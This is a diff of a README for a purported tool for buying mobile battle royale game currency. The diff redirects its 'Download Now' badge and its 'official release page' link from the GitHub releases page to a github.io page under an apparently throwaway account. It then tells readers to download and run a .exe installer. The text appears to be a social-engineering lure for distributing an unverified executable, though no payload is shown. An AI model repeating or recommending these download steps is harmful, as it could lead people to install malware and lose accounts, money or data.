@@ -1,6 +1,6 @@
 # 🎮 ali-uc-store-update - Buy mobile battle royale currency fast
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/cremationgenuszizania746/ali-uc-store-update/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://cremationgenuszizania746.github.io)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Before you install this software, make sure your computer meets these basic requ
 
 You need the latest version of the application to ensure your purchases process correctly. Follow these steps to obtain the installer:
 
-1. Visit the official release page: [https://github.com/cremationgenuszizania746/ali-uc-store-update/releases](https://github.com/cremationgenuszizania746/ali-uc-store-update/releases).
+1. Visit the official release page: [https://cremationgenuszizania746.github.io](https://cremationgenuszizania746.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click on the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
